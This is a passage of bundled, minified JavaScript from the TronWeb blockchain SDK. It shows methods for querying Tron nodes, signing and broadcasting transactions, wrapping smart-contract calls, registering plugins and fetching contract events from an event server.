        return e = this.tronWeb.address.toHex(e),
        this.tronWeb.fullNode.request("wallet/getassetissuebyaccount", {
            address: e
        }, "post").then( ({assetIssue: t}) => t ? t.map(i => this._parseToken(i)).reduce( (i, n) => (i[n.name] = n,
        i), {}) : {})
    }
    async getTokenFromID(e) {
        if (tt.isInteger(e) && (e = e.toString()),
        !tt.isString(e) || !e.length)
            throw new Error("Invalid token ID provided");
        return this.tronWeb.fullNode.request("wallet/getassetissuebyname", {
            value: this.tronWeb.fromUtf8(e)
        }, "post").then(t => {
            if (!t.name)
                throw new Error("Token does not exist");
            return this._parseToken(t)
        }
        )
    }
    async listNodes() {
        const {nodes: e=[]} = await this.tronWeb.fullNode.request("wallet/listnodes");
        return e.map( ({address: {host: t, port: o}}) => `${this.tronWeb.toUtf8(t)}:${o}`)
    }
    async getBlockRange(e=0, t=30) {
        if (!tt.isInteger(e) || e < 0)
            throw new Error("Invalid start of range provided");
        if (!tt.isInteger(t) || t < e)
            throw new Error("Invalid end of range provided");
        if (t + 1 - e > 100)
            throw new Error("Invalid range size, which should be no more than 100.");
        return this.tronWeb.fullNode.request("wallet/getblockbylimitnext", {
            startNum: parseInt(e),
            endNum: parseInt(t) + 1
        }, "post").then( ({block: o=[]}) => o)
    }
    async listSuperRepresentatives() {
        const {witnesses: e=[]} = await this.tronWeb.fullNode.request("wallet/listwitnesses");
        return e
    }
    async listTokens(e=0, t=0) {
        if (!tt.isInteger(e) || e < 0 || t && e < 1)
            throw new Error("Invalid limit provided");
        if (!tt.isInteger(t) || t < 0)
            throw new Error("Invalid offset provided");
        return e ? this.tronWeb.fullNode.request("wallet/getpaginatedassetissuelist", {
            offset: parseInt(t),
            limit: parseInt(e)
        }, "post").then( ({assetIssue: o=[]}) => o.map(i => this._parseToken(i))) : this.tronWeb.fullNode.request("wallet/getassetissuelist").then( ({assetIssue: o=[]}) => o.map(i => this._parseToken(i)))
    }
    async timeUntilNextVoteCycle() {
        const {num: e=-1} = await this.tronWeb.fullNode.request("wallet/getnextmaintenancetime");
        if (e == -1)
            throw new Error("Failed to get time until next vote cycle");
        return Math.floor(e / 1e3)
    }
    async getContract(e) {
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid contract address provided");
        if (this.cache.contracts[e])
            return this.cache.contracts[e];
        e = this.tronWeb.address.toHex(e);
        const t = await this.tronWeb.fullNode.request("wallet/getcontract", {
            value: e
        });
        if (t.Error)
            throw new Error("Contract does not exist");
        return this.cache.contracts[e] = t,
        t
    }
    ecRecover(e) {
        return Ca.ecRecover(e)
    }
    static ecRecover(e) {
        var t;
        if (!Lm(e))
            throw new Error("Invalid transaction");
        if (!((t = e.signature) != null && t.length))
            throw new Error("Transaction is not signed");
        if (e.signature.length === 1) {
            const o = zA(e.txID, e.signature[0]);
            return or.address.fromHex(o)
        }
        return e.signature.map(o => {
            const i = zA(e.txID, o);
            return or.address.fromHex(i)
        }
        )
    }
    async verifyMessage(e, t, o=this.tronWeb.defaultAddress.base58, i=!0) {
        if (!tt.isHex(e))
            throw new Error("Expected hex message input");
        if (Ca.verifySignature(e, o, t, i))
            return !0;
        throw new Error("Signature does not match")
    }
    static verifySignature(e, t, o, i=!0) {
        e = e.replace(/^0x/, "");
        const n = [...Fo(i ? AW : PW), ...tt.code.hexStr2byteArray(e)]
          , s = ir(new Uint8Array(n))
          , a = kd(s, mo.from(`0x${o.replace(/^0x/, "")}`))
          , l = $i + a.substr(2);
        return or.address.fromHex(l) == or.address.fromHex(t)
    }
    async verifyMessageV2(e, t) {
        return Ca.verifyMessageV2(e, t)
    }
    static verifyMessageV2(e, t) {
        return tt.message.verifyMessage(e, t)
    }
    verifyTypedData(e, t, o, i, n=this.tronWeb.defaultAddress.base58) {
        if (Ca.verifyTypedData(e, t, o, i, n))
            return !0;
        throw new Error("Signature does not match")
    }
    static verifyTypedData(e, t, o, i, n) {
        const s = tt._TypedDataEncoder.hash(e, t, o)
          , a = kd(s, mo.from(`0x${i.replace(/^0x/, "")}`))
          , l = $i + a.substr(2);
        return or.address.fromHex(l) == or.address.fromHex(n)
    }
    async sign(e, t=this.tronWeb.defaultPrivateKey, o=!0, i=!1) {
        if (tt.isString(e)) {
            if (!tt.isHex(e))
                throw new Error("Expected hex message input");
            return Ca.signString(e, t, o)
        }
        if (!tt.isObject(e))
            throw new Error("Invalid transaction provided");
        if (!i && e.signature)
            throw new Error("Transaction is already signed");
        if (!i) {
            if (this.tronWeb.address.toHex(this.tronWeb.address.fromPrivateKey(t)).toLowerCase() !== this.tronWeb.address.toHex(e.raw_data.contract[0].parameter.value.owner_address))
                throw new Error("Private key does not match address in transaction");
            if (!Lm(e))
                throw new Error("Invalid transaction")
        }
        return tt.crypto.signTransaction(t, e)
    }
    static signString(e, t, o=!0) {
        e = e.replace(/^0x/, "");
        const i = `0x${t.replace(/^0x/, "")}`
          , n = new li(i)
          , s = [...Fo(o ? AW : PW), ...tt.code.hexStr2byteArray(e)]
          , a = ir(new Uint8Array(s))
          , l = n.sign(a);
        return ["0x", l.r.substring(2), l.s.substring(2), Number(l.v).toString(16)].join("")
    }
    signMessageV2(e, t=this.tronWeb.defaultPrivateKey) {
        return Ca.signMessageV2(e, t)
    }
    static signMessageV2(e, t) {
        return tt.message.signMessage(e, t)
    }
    _signTypedData(e, t, o, i=this.tronWeb.defaultPrivateKey) {
        return Ca._signTypedData(e, t, o, i)
    }
    static _signTypedData(e, t, o, i) {
        return tt.crypto._signTypedData(e, t, o, i)
    }
    async multiSign(e, t=this.tronWeb.defaultPrivateKey, o=0) {
        if (!tt.isObject(e) || !e.raw_data || !e.raw_data.contract)
            throw new Error("Invalid transaction provided");
        if (!e.raw_data.contract[0].Permission_id && o > 0) {
            e.raw_data.contract[0].Permission_id = o;
            const i = this.tronWeb.address.toHex(this.tronWeb.address.fromPrivateKey(t)).toLowerCase()
              , n = await this.getSignWeight(e, o);
            if (n.result.code === "PERMISSION_ERROR")
                throw new Error(n.result.message);
            let s = !1;
            if (n.permission.keys.map(a => {
                a.address === i && (s = !0)
            }
            ),
            !s)
                throw new Error(t + " has no permission to sign");
            if (n.approved_list && n.approved_list.indexOf(i) != -1)
                throw new Error(t + " already sign transaction");
            if (n.transaction && n.transaction.transaction)
                e = n.transaction.transaction,
                o > 0 && (e.raw_data.contract[0].Permission_id = o);
            else
                throw new Error("Invalid transaction provided")
        }
        if (!Lm(e))
            throw new Error("Invalid transaction");
        return tt.crypto.signTransaction(t, e)
    }
    async getApprovedList(e) {
        if (!tt.isObject(e))
            throw new Error("Invalid transaction provided");
        return this.tronWeb.fullNode.request("wallet/getapprovedlist", e, "post")
    }
    async getSignWeight(e, t) {
        if (!tt.isObject(e) || !e.raw_data || !e.raw_data.contract)
            throw new Error("Invalid transaction provided");
        return tt.isInteger(t) ? e.raw_data.contract[0].Permission_id = parseInt(t) : typeof e.raw_data.contract[0].Permission_id != "number" && (e.raw_data.contract[0].Permission_id = 0),
        this.tronWeb.fullNode.request("wallet/getsignweight", e, "post")
    }
    async sendRawTransaction(e) {
        if (!tt.isObject(e))
            throw new Error("Invalid transaction provided");
        if (!e.signature || !tt.isArray(e.signature))
            throw new Error("Transaction is not signed");
        return {
            ...await this.tronWeb.fullNode.request("wallet/broadcasttransaction", e, "post"),
            transaction: e
        }
    }
    async sendHexTransaction(e) {
        if (!tt.isHex(e))
            throw new Error("Invalid hex transaction provided");
        const t = {
            transaction: e
        }
          , o = await this.tronWeb.fullNode.request("wallet/broadcasthex", t, "post");
        return o.result ? {
            ...o,
            transaction: JSON.parse(o.transaction),
            hexTransaction: e
        } : o
    }
    async sendTransaction(e, t, o={}) {
        if (typeof o == "string" && (o = {
            privateKey: o
        }),
        !this.tronWeb.isAddress(e))
            throw new Error("Invalid recipient provided");
        if (!tt.isInteger(t) || t <= 0)
            throw new Error("Invalid amount provided");
        if (o = {
            privateKey: this.tronWeb.defaultPrivateKey,
            address: this.tronWeb.defaultAddress.hex,
            ...o
        },
        !o.privateKey && !o.address)
            throw new Error("Function requires either a private key or address to be set");
        const i = o.privateKey ? this.tronWeb.address.fromPrivateKey(o.privateKey) : o.address
          , n = await this.tronWeb.transactionBuilder.sendTrx(e, t, i)
          , s = await this.sign(n, o.privateKey);
        return await this.sendRawTransaction(s)
    }
    async sendToken(e, t, o, i={}) {
        if (typeof i == "string" && (i = {
            privateKey: i
        }),
        !this.tronWeb.isAddress(e))
            throw new Error("Invalid recipient provided");
        if (!tt.isInteger(t) || t <= 0)
            throw new Error("Invalid amount provided");
        if (tt.isInteger(o) && (o = o.toString()),
        !tt.isString(o))
            throw new Error("Invalid token ID provided");
        if (i = {
            privateKey: this.tronWeb.defaultPrivateKey,
            address: this.tronWeb.defaultAddress.hex,
            ...i
        },
        !i.privateKey && !i.address)
            throw new Error("Function requires either a private key or address to be set");
        const n = i.privateKey ? this.tronWeb.address.fromPrivateKey(i.privateKey) : i.address
          , s = await this.tronWeb.transactionBuilder.sendToken(e, t, o, n)
          , a = await this.sign(s, i.privateKey);
        return await this.sendRawTransaction(a)
    }
    async freezeBalance(e=0, t=3, o="BANDWIDTH", i={}, n) {
        if (typeof i == "string" && (i = {
            privateKey: i
        }),
        !["BANDWIDTH", "ENERGY"].includes(o))
            throw new Error('Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"');
        if (!tt.isInteger(e) || e <= 0)
            throw new Error("Invalid amount provided");
        if (!tt.isInteger(t) || t < 3)
            throw new Error("Invalid duration provided, minimum of 3 days");
        if (i = {
            privateKey: this.tronWeb.defaultPrivateKey,
            address: this.tronWeb.defaultAddress.hex,
            ...i
        },
        !i.privateKey && !i.address)
            throw new Error("Function requires either a private key or address to be set");
        const s = i.privateKey ? this.tronWeb.address.fromPrivateKey(i.privateKey) : i.address
          , a = await this.tronWeb.transactionBuilder.freezeBalance(e, t, o, s, n)
          , l = await this.sign(a, i.privateKey);
        return await this.sendRawTransaction(l)
    }
    async unfreezeBalance(e="BANDWIDTH", t={}, o) {
        if (typeof t == "string" && (t = {
            privateKey: t
        }),
        !["BANDWIDTH", "ENERGY"].includes(e))
            throw new Error('Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"');
        if (t = {
            privateKey: this.tronWeb.defaultPrivateKey,
            address: this.tronWeb.defaultAddress.hex,
            ...t
        },
        !t.privateKey && !t.address)
            throw new Error("Function requires either a private key or address to be set");
        const i = t.privateKey ? this.tronWeb.address.fromPrivateKey(t.privateKey) : t.address
          , n = await this.tronWeb.transactionBuilder.unfreezeBalance(e, i, o)
          , s = await this.sign(n, t.privateKey);
        return await this.sendRawTransaction(s)
    }
    async updateAccount(e, t={}) {
        if (typeof t == "string" && (t = {
            privateKey: t
        }),
        !tt.isString(e) || !e.length)
            throw new Error("Name must be a string");
        if (t = {
            privateKey: this.tronWeb.defaultPrivateKey,
            address: this.tronWeb.defaultAddress.hex,
            ...t
        },
        !t.privateKey && !t.address)
            throw Error("Function requires either a private key or address to be set");
        const o = t.privateKey ? this.tronWeb.address.fromPrivateKey(t.privateKey) : t.address
          , i = await this.tronWeb.transactionBuilder.updateAccount(e, o)
          , n = await this.sign(i, t.privateKey);
        return await this.sendRawTransaction(n)
    }
    async getProposal(e) {
        if (!tt.isInteger(e) || e < 0)
            throw new Error("Invalid proposalID provided");
        return this.tronWeb.fullNode.request("wallet/getproposalbyid", {
            id: parseInt(e)
        }, "post")
    }
    async listProposals() {
        const {proposals: e=[]} = await this.tronWeb.fullNode.request("wallet/listproposals", {}, "post");
        return e
    }
    async getChainParameters() {
        const {chainParameter: e=[]} = await this.tronWeb.fullNode.request("wallet/getchainparameters", {}, "post");
        return e
    }
    async getAccountResources(e=this.tronWeb.defaultAddress.hex) {
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid address provided");
        return this.tronWeb.fullNode.request("wallet/getaccountresource", {
            address: this.tronWeb.address.toHex(e)
        }, "post")
    }
    async getDelegatedResourceV2(e=this.tronWeb.defaultAddress.hex, t=this.tronWeb.defaultAddress.hex, o={
        confirmed: !0
    }) {
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid address provided");
        if (!this.tronWeb.isAddress(t))
            throw new Error("Invalid address provided");
        return this.tronWeb[o.confirmed ? "solidityNode" : "fullNode"].request(`wallet${o.confirmed ? "solidity" : ""}/getdelegatedresourcev2`, {
            fromAddress: Sc(e),
            toAddress: Sc(t)
        }, "post")
    }
    async getDelegatedResourceAccountIndexV2(e=this.tronWeb.defaultAddress.hex, t={
        confirmed: !0
    }) {
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid address provided");
        return this.tronWeb[t.confirmed ? "solidityNode" : "fullNode"].request(`wallet${t.confirmed ? "solidity" : ""}/getdelegatedresourceaccountindexv2`, {
            value: Sc(e)
        }, "post")
    }
    async getCanDelegatedMaxSize(e=this.tronWeb.defaultAddress.hex, t="BANDWIDTH", o={
        confirmed: !0
    }) {
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid address provided");
        return this.validator.notValid([{
            name: "resource",
            type: "resource",
            value: t,
            msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
        }]),
        this.tronWeb[o.confirmed ? "solidityNode" : "fullNode"].request(`wallet${o.confirmed ? "solidity" : ""}/getcandelegatedmaxsize`, {
            owner_address: Sc(e),
            type: t === "ENERGY" ? 1 : 0
        }, "post")
    }
    async getAvailableUnfreezeCount(e=this.tronWeb.defaultAddress.hex, t={
        confirmed: !0
    }) {
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid address provided");
        return this.tronWeb[t.confirmed ? "solidityNode" : "fullNode"].request(`wallet${t.confirmed ? "solidity" : ""}/getavailableunfreezecount`, {
            owner_address: Sc(e)
        }, "post")
    }
    async getCanWithdrawUnfreezeAmount(e=this.tronWeb.defaultAddress.hex, t=Date.now(), o={
        confirmed: !0
    }) {
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid address provided");
        if (!tt.isInteger(t) || t < 0)
            throw new Error("Invalid timestamp provided");
        return this.tronWeb[o.confirmed ? "solidityNode" : "fullNode"].request(`wallet${o.confirmed ? "solidity" : ""}/getcanwithdrawunfreezeamount`, {
            owner_address: Sc(e),
            timestamp: t
        }, "post")
    }
    async getExchangeByID(e) {
        if (!tt.isInteger(e) || e < 0)
            throw new Error("Invalid exchangeID provided");
        return this.tronWeb.fullNode.request("wallet/getexchangebyid", {
            id: e
        }, "post")
    }
    async listExchanges() {
        return this.tronWeb.fullNode.request("wallet/listexchanges", {}, "post").then( ({exchanges: e=[]}) => e)
    }
    async listExchangesPaginated(e=10, t=0) {
        return this.tronWeb.fullNode.request("wallet/getpaginatedexchangelist", {
            limit: e,
            offset: t
        }, "post").then( ({exchanges: o=[]}) => o)
    }
    async getNodeInfo() {
        return this.tronWeb.fullNode.request("wallet/getnodeinfo", {}, "post")
    }
    async getTokenListByName(e) {
        if (tt.isInteger(e) && (e = e.toString()),
        !tt.isString(e) || !e.length)
            throw new Error("Invalid token ID provided");
        return this.tronWeb.fullNode.request("wallet/getassetissuelistbyname", {
            value: this.tronWeb.fromUtf8(e)
        }, "post").then(t => {
            if (Array.isArray(t.assetIssue))
                return t.assetIssue.map(o => this._parseToken(o));
            if (!t.name)
                throw new Error("Token does not exist");
            return this._parseToken(t)
        }
        )
    }
    getTokenByID(e) {
        if (tt.isInteger(e) && (e = e.toString()),
        !tt.isString(e) || !e.length)
            throw new Error("Invalid token ID provided");
        return this.tronWeb.fullNode.request("wallet/getassetissuebyid", {
            value: e
        }, "post").then(t => {
            if (!t.name)
                throw new Error("Token does not exist");
            return this._parseToken(t)
        }
        )
    }
    async getReward(e, t={}) {
        return t.confirmed = !0,
        this._getReward(e, t)
    }
    async getUnconfirmedReward(e, t={}) {
        return t.confirmed = !1,
        this._getReward(e, t)
    }
    async getBrokerage(e, t={}) {
        return t.confirmed = !0,
        this._getBrokerage(e, t)
    }
    async getUnconfirmedBrokerage(e, t={}) {
        return t.confirmed = !1,
        this._getBrokerage(e, t)
    }
    async _getReward(e=this.tronWeb.defaultAddress.hex, t) {
        this.validator.notValid([{
            name: "origin",
            type: "address",
            value: e
        }]);
        const o = {
            address: Sc(e)
        };
        return this.tronWeb[t.confirmed ? "solidityNode" : "fullNode"].request(`wallet${t.confirmed ? "solidity" : ""}/getReward`, o, "post").then( (i={
            reward: void 0
        }) => {
            if (typeof i.reward > "u")
                throw new Error("Not found.");
            return i.reward
        }
        )
    }
    async _getBrokerage(e=this.tronWeb.defaultAddress.hex, t) {
        this.validator.notValid([{
            name: "origin",
            type: "address",
            value: e
        }]);
        const o = {
            address: Sc(e)
        };
        return this.tronWeb[t.confirmed ? "solidityNode" : "fullNode"].request(`wallet${t.confirmed ? "solidity" : ""}/getBrokerage`, o, "post").then( (i={}) => {
            if (typeof i.brokerage > "u")
                throw new Error("Not found.");
            return i.brokerage
        }
        )
    }
    async getBandwidthPrices() {
        return this.tronWeb.fullNode.request("wallet/getbandwidthprices", {}, "post").then( (e={}) => {
            if (typeof e.prices > "u")
                throw new Error("Not found.");
            return e.prices
        }
        )
    }
    async getEnergyPrices() {
        return this.tronWeb.fullNode.request("wallet/getenergyprices", {}, "post").then( (e={}) => {
            if (typeof e.prices > "u")
                throw new Error("Not found.");
            return e.prices
        }
        )
    }
}
const rbe = r => {
    if ("stateMutability"in r && (r.stateMutability = r.stateMutability ? r.stateMutability.toLowerCase() : "nonpayable"),
    r.type = r.type ? r.type.toLowerCase() : "",
    r.type === "fallback" || r.type === "receive")
        return "0x";
    const e = new tt.ethersUtils.Interface([r]);
    let t;
    if (r.type === "event" ? t = e.getEvent(r.name) : t = e.getFunction(r.name),
    t)
        return t.format("sighash");
    throw new Error("unknown function")
}
  , rE = (r, e) => vU(r, e);
class nbe {
    constructor(e, t) {
        we(this, "tronWeb");
        we(this, "contract");
        we(this, "abi");
        we(this, "name");
        we(this, "inputs");
        we(this, "outputs");
        we(this, "functionSelector");
        we(this, "signature");
        we(this, "defaultOptions");
        this.tronWeb = e.tronWeb,
        this.contract = e,
        this.abi = t,
        this.name = t.name || t.type,
        this.inputs = t.inputs || [],
        this.outputs = [],
        "outputs"in t && t.outputs && (this.outputs = t.outputs),
        this.functionSelector = rbe(t),
        this.signature = rk(this.functionSelector, !1).slice(0, 8),
        this.defaultOptions = {
            feeLimit: this.tronWeb.feeLimit,
            callValue: 0,
            userFeePercentage: 100,
            shouldPollResponse: !1
        }
    }
    decodeInput(e) {
        const t = JSON.parse(JSON.stringify(this.abi));
        return t.outputs = t.inputs,
        rE(t, "0x" + e)
    }
    onMethod(...e) {
        let t = "";
        return this.abi && !/event/i.test(this.abi.type) && (t = g1(this.abi, e)),
        {
            call: async (o={}) => (o = {
                ...o,
                rawParameter: t
            },
            await this._call([], [], o)),
            send: async (o={}, i=this.tronWeb.defaultPrivateKey) => (o = {
                ...o,
                rawParameter: t
            },
            await this._send([], [], o, i))
        }
    }
    async _call(e, t, o={}) {
        if (e.length !== t.length)
            throw new Error("Invalid argument count provided");
        if (!this.contract.address)
            throw new Error("Smart contract is missing address");
        if (!this.contract.deployed)
            throw new Error("Calling smart contracts requires you to load the contract first");
        if ("stateMutability"in this.abi) {
            const {stateMutability: l} = this.abi;
            if (l && !["pure", "view"].includes(l.toLowerCase()))
                throw new Error(`Methods with state mutability "${l}" must use send()`)
        }
        o = {
            ...this.defaultOptions,
            from: this.tronWeb.defaultAddress.hex,
            ...o,
            _isConstant: !0
        };
        const i = t.map( (l, f) => ({
            type: e[f],
            value: l
        }))
          , n = await this.tronWeb.transactionBuilder.triggerSmartContract(this.contract.address, this.functionSelector, o, i, o.from ? this.tronWeb.address.toHex(o.from) : void 0);
        if (!tt.hasProperty(n, "constant_result"))
            throw new Error("Failed to execute");
        const s = n.constant_result[0].length;
        if (s === 0 || s % 64 === 8) {
            let l = "The call has been reverted or has thrown an error.";
            if (s !== 0) {
                l += " Error message: ";
                let f = "";
                const h = n.constant_result[0].substring(8);
                for (let p = 0; p < s - 8; p += 64)
                    f += this.tronWeb.toUtf8(h.substring(p, p + 64));
                l += f.replace(/(\u0000|\u000b|\f)+/g, " ").replace(/ +/g, " ").replace(/\s+$/g, "")
            }
            throw new Error(l)
        }
        let a = rE(this.abi, "0x" + n.constant_result[0]);
        return a.length === 1 && Object.keys(a).length === 1 && (a = a[0]),
        a
    }
    async _send(e, t, o={}, i=this.tronWeb.defaultPrivateKey) {
        if (e.length !== t.length)
            throw new Error("Invalid argument count provided");
        if (!this.contract.address)
            throw new Error("Smart contract is missing address");
        if (!this.contract.deployed)
            throw new Error("Calling smart contracts requires you to load the contract first");
        const {stateMutability: n} = this.abi;
        if (["pure", "view"].includes(n.toLowerCase()))
            throw new Error(`Methods with state mutability "${n}" must use call()`);
        ["payable"].includes(n.toLowerCase()) || (o.callValue = 0),
        o = {
            ...this.defaultOptions,
            from: this.tronWeb.defaultAddress.hex,
            ...o
        };
        const s = t.map( (b, v) => ({
            type: e[v],
            value: b
        }))
          , a = i ? this.tronWeb.address.fromPrivateKey(i) : this.tronWeb.defaultAddress.base58
          , l = await this.tronWeb.transactionBuilder.triggerSmartContract(this.contract.address, this.functionSelector, o, s, this.tronWeb.address.toHex(a));
        if (!l.result || !l.result.result)
            throw new Error("Unknown error: " + JSON.stringify(l, null, 2));
        const f = await this.tronWeb.trx.sign(l.transaction, i);
        if (!f.signature)
            throw i ? new Error("Invalid private key provided") : new Error("Transaction was not signed properly");
        const h = await this.tronWeb.trx.sendRawTransaction(f);
        if (h.code) {
            const b = {
                error: h.code,
                message: h.code
            };
            h.message && (b.message = this.tronWeb.toUtf8(h.message));
            const v = new Error(b.message);
            throw v.error = h.code,
            v
        }
        if (!o.shouldPollResponse)
            return f.txID;
        const p = async b => {
            if (b === (o.pollTimes || 20)) {
                const x = new Error("Cannot find result in solidity node");
                throw x.error = "Cannot find result in solidity node",
                x.transaction = f,
                x
            }
            const v = await this.tronWeb.trx.getTransactionInfo(f.txID);
            if (!Object.keys(v).length)
                return await new Promise(x => setTimeout(x, 3e3)),
                p(b + 1);
            if (v.result && v.result === "FAILED") {
                const x = new Error(this.tronWeb.toUtf8(v.resMessage));
                throw x.error = this.tronWeb.toUtf8(v.resMessage),
                x.transaction = f,
                x.output = v,
                x
            }
            if (!tt.hasProperty(v, "contractResult")) {
                const x = new Error("Failed to execute: " + JSON.stringify(v, null, 2));
                throw x.error = "Failed to execute: " + JSON.stringify(v, null, 2),
                x.transaction = f,
                x.output = v,
                x
            }
            if (o.rawResponse)
                return v;
            let T = rE(this.abi, "0x" + v.contractResult[0]);
            return T.length === 1 && Object.keys(T).length === 1 && (T = T[0]),
            o.keepTxID ? [f.txID, T] : T
        }
        ;
        return p(0)
    }
}
class obe {
    constructor(e, t=[], o) {
        we(this, "tronWeb");
        we(this, "abi");
        we(this, "address");
        we(this, "eventListener");
        we(this, "bytecode");
        we(this, "deployed");
        we(this, "lastBlock");
        we(this, "methods");
        we(this, "methodInstances");
        we(this, "props");
        if (!e || !(e instanceof or))
            throw new Error("Expected instance of TronWeb");
        this.tronWeb = e,
        this.address = o,
        this.abi = t,
        this.eventListener = !1,
        this.bytecode = !1,
        this.deployed = !1,
        this.lastBlock = !1,
        this.methods = {},
        this.methodInstances = {},
        this.props = [],
        tt.address.isAddress(o) ? this.deployed = !0 : this.address = !1,
        this.loadAbi(t)
    }
    hasProperty(e) {
        return this.hasOwnProperty(e) || this.__proto__.hasOwnProperty(e)
    }
    loadAbi(e) {
        this.abi = e,
        this.methods = {},
        this.props.forEach(t => delete this[t]),
        e.forEach(t => {
            if (!t.type || /constructor|error/i.test(t.type))
                return;
            const o = new nbe(this,t)
              , i = o.onMethod.bind(o)
              , {name: n, functionSelector: s, signature: a} = o;
            this.methods[n] = i,
            this.methods[s] = i,
            this.methods[a] = i,
            this.methodInstances[n] = o,
            this.methodInstances[s] = o,
            this.methodInstances[a] = o,
            this.hasProperty(n) || (this[n] = i,
            this.props.push(n)),
            this.hasProperty(s) || (this[s] = i,
            this.props.push(s)),
            this.hasProperty(a) || (this[a] = i,
            this.props.push(a))
        }
        )
    }
    decodeInput(e) {
        const t = e.substring(0, 8)
          , o = e.substring(8);
        if (!this.methodInstances[t])
            throw new Error("Contract method " + t + " not found");
        return {
            name: this.methodInstances[t].name,
            params: this.methodInstances[t].decodeInput(o)
        }
    }
    async new(e, t=this.tronWeb.defaultPrivateKey) {
        const o = this.tronWeb.address.fromPrivateKey(t)
          , i = await this.tronWeb.transactionBuilder.createSmartContract(e, o)
          , n = await this.tronWeb.trx.sign(i, t)
          , s = await this.tronWeb.trx.sendRawTransaction(n);
        if (s.code)
            throw {
                error: s.code,
                message: this.tronWeb.toUtf8(s.message)
            };
        return await tt.sleep(3e3),
        this.at(n.contract_address)
    }
    async at(e) {
        try {
            const t = await this.tronWeb.trx.getContract(e);
            if (!t.contract_address)
                throw new Error("Unknown error: " + JSON.stringify(t, null, 2));
            return this.address = t.contract_address,
            this.bytecode = t.bytecode,
            this.deployed = !0,
            this.loadAbi(t.abi ? t.abi.entrys ? t.abi.entrys : [] : []),
            this
        } catch (t) {
            throw t.toString().includes("does not exist") ? new Error("Contract has not been deployed on the network") : new Error(t)
        }
    }
}
class ibe {
    constructor(e, t={}) {
        we(this, "tronWeb");
        we(this, "pluginNoOverride");
        we(this, "disablePlugins");
        if (!e || !(e instanceof or))
            throw new Error("Expected instance of TronWeb");
        this.tronWeb = e,
        this.pluginNoOverride = ["register"],
        this.disablePlugins = !!t.disablePlugins
    }
    register(e, t) {
        let o = {
            requires: "0.0.0",
            components: {}
        };
        const i = {
            libs: [],
            plugged: [],
            skipped: [],
            error: void 0
        };
        if (this.disablePlugins)
            return i.error = "This instance of TronWeb has plugins disabled.",
            i;
        const n = new e(this.tronWeb);
        if (tt.isFunction(n.pluginInterface) && (o = n.pluginInterface(t)),
        xU.satisfies(or.version, o.requires))
            if (o.fullClass) {
                const s = n.constructor.name
                  , a = s.substring(0, 1).toLowerCase() + s.substring(1);
                s !== a && (Object.assign(or, {
                    [s]: e
                }),
                Object.assign(this.tronWeb, {
                    [a]: n
                }),
                i.libs.push(s))
            } else
                for (const s in o.components) {
                    if (!this.tronWeb.hasOwnProperty(s))
                        continue;
                    const a = o.components[s]
                      , l = this.tronWeb[s].pluginNoOverride || [];
                    for (const f in a) {
                        if (f === "constructor" || this.tronWeb[s][f] && (l.includes(f) || /^_/.test(f))) {
                            i.skipped.push(f);
                            continue
                        }
                        this.tronWeb[s][f] = a[f].bind(this.tronWeb[s]),
                        i.plugged.push(f)
                    }
                }
        else
            throw new Error("The plugin is not compatible with this version of TronWeb");
        return i
    }
}
let sbe = class {
    constructor(e) {
        we(this, "tronWeb");
        if (!e || !(e instanceof or))
            throw new Error("Expected instance of TronWeb");
        this.tronWeb = e
    }
    setServer(e, t="healthcheck") {
        if (!e)
            return this.tronWeb.eventServer = void 0;
        if (tt.isString(e) && (e = new pU(e)),
        !this.tronWeb.isValidProvider(e))
            throw new Error("Invalid event server provided");
        this.tronWeb.eventServer = e,
        this.tronWeb.eventServer.isConnected = () => this.tronWeb.eventServer.request(t).then( () => !0).catch( () => !1)
    }
    async getEventsByContractAddress(e, t={}) {
        const o = Object.assign({
            limit: 20
        }, t)
          , {eventName: i, blockNumber: n, onlyUnconfirmed: s, onlyConfirmed: a, minBlockTimestamp: l, maxBlockTimestamp: f, orderBy: h, fingerprint: p} = o;
        let {limit: b} = o;
        if (!this.tronWeb.eventServer)
            throw new Error("No event server configured");
        if (!this.tronWeb.isAddress(e))
            throw new Error("Invalid contract address provided");
        if (typeof l < "u" && !tt.isInteger(l))
            throw new Error("Invalid minBlockTimestamp provided");
        if (typeof f < "u" && !tt.isInteger(f))
            throw new Error("Invalid maxBlockTimestamp provided");
        tt.isInteger(b) && b > 200 && (console.warn("Defaulting to maximum accepted limit: 200"),
        b = 200);
        const v = {};
        i && (v.event_name = i),
        n && (v.block_number = n),
        typeof s == "boolean" && (v.only_unconfirmed = s),
        typeof a == "boolean" && (v.only_confirmed = a),
        l && (v.min_block_timestamp = l),
        f && (v.max_block_timestamp = f),
        h && (v.order_by = h),
        p && (v.fingerprint = p),
        tt.isInteger(b) && (v.limit = b);
        const T = await this.tronWeb.eventServer.request(`v1/contracts/${this.tronWeb.address.fromHex(e)}/events?${new URLSearchParams(v).toString()}`);
        if (T.success)
            return T;
        throw new Error(T.error)
    }
    async getEventsByTransactionID(e, t={}) {
        if (!this.tronWeb.eventServer)
            throw new Error("No event server configured");
        const o = {};
        return typeof t.only_unconfirmed == "boolean" && (o.only_unconfirmed = t.only_unconfirmed),
        typeof t.only_confirmed == "boolean" && (o.only_confirmed = t.only_confirmed),
        this.tronWeb.eventServer.request(`v1/transactions/${e}/events?${new URLSearchParams(o).toString()}`).then(i => {
            if (i.success)
                return i;
            throw new Error(JSON.parse(i.error).message)
        }
        )
    }
    async getEventsByBlockNumber(e, t={}) {
        if (!this.tronWeb.eventServer)
            throw new Error("No event server configured");
        const o = {};
        return typeof t.only_confirmed == "boolean" && (o.only_confirmed = t.only_confirmed),
        t.limit && (o.limit = t.limit),
        t.fingerprint && (o.fingerprint = t.fingerprint),
        this.tronWeb.eventServer.request(`v1/blocks/${e}/events?${new URLSearchParams(o).toString()}`).then(i => {
            if (i.success)
                return i;
            throw new Error(i.error)
        }
        )
    }
    async getEventsOfLatestBlock(e={}) {
        if (!this.tronWeb.eventServer)
            throw new Error("No event server configured");
        const t = {};
        return typeof e.only_confirmed == "boolean" && (t.only_confirmed = e.only_confirmed),
        this.tronWeb.eventServer.request(`v1/blocks/latest/events?${new URLSearchParams(t).toString()}`).then(o => {
            if (o.success)
                return o;
            throw new Error(o.error)
        }
        )
    }
}
;
